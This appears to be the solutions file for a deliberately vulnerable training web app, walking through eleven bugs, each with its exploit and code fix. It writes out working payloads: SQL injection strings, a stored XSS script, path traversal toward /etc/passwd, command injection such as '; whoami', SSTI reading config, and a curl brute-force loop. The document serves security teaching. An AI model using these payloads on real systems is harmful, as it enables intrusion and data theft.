# Solutions - UsaHack

Each bug below shows: the exploit, why it works, and the fix. Try to solve each
challenge yourself before reading the answer.

---

## 1. SQL injection on `/search`

Try:
```
/search?q=' OR 1=1 --
```
This returns **every** product, because the query becomes:

```sql
SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%'
```

The `--` comments out the rest of the line, and `OR 1=1` is always true.

**Why:** user input is concatenated straight into the SQL string (in `app.py`,
`search()`).

**Fix (parameterized queries - NEVER build SQL with user input):**

```python
rows = conn.execute(
    "SELECT * FROM products WHERE name LIKE ?",
    (f"%{q}%",),
).fetchall()
```

---

## 2. SQL injection on `/login` (mission: log in without a password)

In the username field, enter:

```
admin' OR '1'='1
```

with anything in the password field. The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
```

`'1'='1'` short-circuits to true, so the query returns admin's row.

**Why:** raw string concatenation again - plus passwords are stored in plaintext.
Take a peek at the database:

```
sqlite3 shop.db
SELECT * FROM users;
```

**Fix:** parameterized query + store password hashes only (never the plaintext):

```python
from werkzeug.security import check_password_hash
row = conn.execute(
    "SELECT * FROM users WHERE username = ?", (username,)
).fetchone()
if row and check_password_hash(row["password_hash"], password):
    ...
```

---

## 3. IDOR on `/profile` (mission: steal everyone's secret... well, one step at a time)

Visit:
```
/profile?id=2
/profile?id=3
```
There's no login check at all - you can view any user by guessing their id. This is
an Insecure Direct Object Reference (IDOR).

**Why:** the route trusts the `id` parameter and never verifies the requester.

**Fix:** only ever show the profile of the currently authenticated user; never
accept an arbitrary id from the client:

```python
user_id = get_current_logged_in_user_id()
row = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
```

---

## 4. Stored XSS on `/comments` (mission: make it run `alert(1)`)

Post a comment with the body:

```html
<script>alert('pwned')</script>
```

It's stored in the DB and rendered back unescaped on `/comments`, so the script
runs in **every visitor's browser**. This is stored (persistent) XSS - the most
dangerous kind, because the payload lives on the server.

**Why:** comment text is written into the HTML without escaping.

**Fix:** never insert raw user data into HTML. Let the template engine escape it:

```html
<li><strong>{{ comment.author }}</strong>: {{ comment.body }}</li>
```

(Jinja auto-escapes `{{ ... }}` by default. The app deliberately bypasses it.)

---

## 5. Client-side price manipulation (mission: laptop for $0.01)

Open your browser's dev tools (F12), go to the Products page, and edit the hidden
form field before clicking "Buy now":

```html
<input type="hidden" name="price" value="0.01">
```

The total charged shows $0.01.

**Why:** the price is sent by the **client** and the server trusts it. A client can
always send whatever it wants - hidden fields and disabled buttons stop nobody.

**Fix:** compute the price server-side from the product id:

```python
row = conn.execute("SELECT price FROM products WHERE id = ?", (product_id,)).fetchone()
total = row["price"]
```

---

## 6. Path traversal on `/files`

Try:
```
/files?name=../../usahack/app.py
```
You can read the application source. On a normal server you would point higher,
e.g. `../../../../etc/passwd`. The server joins your filename onto the `docs`
folder and reads whatever results.

**Why:** user-controlled filename with no validation.

**Fix:** resolve the path and verify it stays inside `docs`:

```python
from pathlib import Path
docs_dir = Path(__file__).resolve().parent / "docs"
target = (docs_dir / name).resolve()
if not target.is_relative_to(docs_dir):
    abort(403)
```

---

## 7. Forgeable admin cookie (mission: get into the admin panel)

Log in as anyone (e.g. `alice` / `password123`), open dev tools (F12) -> Application
-> Cookies, and change the `user` cookie to `admin`. Refresh `/admin` - welcome to
the panel, where all the flags are.

**Why:** the app decides "you're an admin" by trusting a client-set cookie that
isn't signed or verified server-side.

**Fix:** use a server-side session signed with a real secret. In Flask:

```python
from flask import session
app.secret_key = os.environ["SECRET_KEY"]  # long random value, kept secret
session["role"] = "admin"                  # set on the server at login
```

---

## 8. Command injection on `/server` (mission: run `whoami`)

Type this into the ping box:

```
8.8.8.8; whoami
```

The `;` ends the `ping` command, and your second command runs. Try `; cat server_flag.txt`
for the flag, or `; ls` to browse the server's folder.

**Why:** the app builds the shell command by string concatenation and runs it with
`shell=True`. That's the exact pattern behind real RCE (remote code execution) bugs.

```python
# vulnerable
subprocess.run(f"ping -c 1 {host}", shell=True, ...)
```

**Fix:** never pass user input into a shell. Use an argument list (no `shell=True`)
and whitelist what's allowed:

```python
import subprocess
result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
```

This passes `host` as a single argument, never interpreted by a shell.

---

## 9. SSTI on `/ssti` (mission: render `7*7` as `49`)

Type this into the name field:

```
{{ 7*7 }}
```

The page greets you with "Hello 49!". Now try:

```
{{ config.FLAG }}
```

That reads the app's config and prints the hidden flag. SSTI is a direct route to
full remote code execution on the server.

**Why:** your input is inserted into a Jinja template and rendered:

```python
render_template_string(f"Hello {name}!")
```

Jinja evaluates `{{ ... }}` inside the template, so you're running template code.

**Fix:** never render user input as a template. Treat it as plain data and let the
template engine escape it:

```python
return render_template("hello.html", name=name)  # name stays data, not code
```

---

## 10. Brute-forcing dave (mission: guess his password)

The login has no rate limiting and no lockout, so you can try as many passwords as
you like. Use curl or a tiny script:

```bash
for pw in admin password 123456 letmein qwerty; do
  code=$(curl -s -o /dev/null -w '%{http_code}' \
    -d "username=dave&password=$pw" http://127.0.0.1:5000/login)
  echo "$pw -> $code"
done
```

`302` (a redirect) means it worked: dave's password is `letmein`. With a real
wordlist, the same script is a brute-force attack.

**Why:** no limit on failed attempts means attackers get infinite guesses, and the
password is weak (`letmein`).

**Fix:**
- Rate-limit logins (e.g. slow down or block after 5 failures per account/IP).
- Enforce strong passwords.
- Best defense: multi-factor authentication.

```python
# pseudocode - track attempts per username+IP
if failures(username, ip) >= 5:
    block(username, ip)          # or force a delay
```

---

## 11. CSRF: change admin's email (mission: without logging in as admin)

1. Log in as admin (`admin` / `admin123` - you dumped these earlier).
2. Open a new tab and visit the email change as a **link**:
   ```
   http://127.0.0.1:5000/settings?email=hacked@usahack.test
   ```
3. Go to `/settings` - admin's email is now `hacked@usahack.test` and the flag
   is shown.

In real life the attacker hosts a page that silently redirects the victim to that
URL (or auto-submits a form). The browser attaches the victim's session cookie, so
the server can't tell the request isn't from the victim.

**Why:** the app authenticates with a cookie, and the state-changing action (email
change) has no CSRF token and even works over GET. Anyone who can trigger that
request from the victim's browser wins.

**Fix:**
- Never change state over GET.
- Add an unguessable CSRF token to every state-changing form, and verify it
  server-side. In Flask:

```python
from flask_wtf import FlaskForm
# each form carries a token that the server validates before acting
```

- Use same-site cookies (they don't stop all CSRF, but they block the common cases).

---

## Summary of the fixes
1. Use parameterized SQL queries (`?` placeholders) - everywhere.
2. Hash passwords (`werkzeug.security`), never store plaintext.
3. Don't trust client input - validate ids, prices, and filenames server-side.
4. Escape output in templates (use `{{ }}`, never `|safe` on user data).
5. Use server-side signed sessions for auth, not forgeable cookies.
6. Enforce access control on every protected route, not just the button.
7. Never build shell commands from user input (no `shell=True`).
8. Never render user input as a template.
9. Rate-limit logins; the server should only allow a few wrong guesses.
10. Add CSRF tokens to every state-changing action; never change state over GET.

These are the same bugs behind most real-world breaches. Fixing all of them in this
tiny app is a complete OWASP Top 10 crash course.
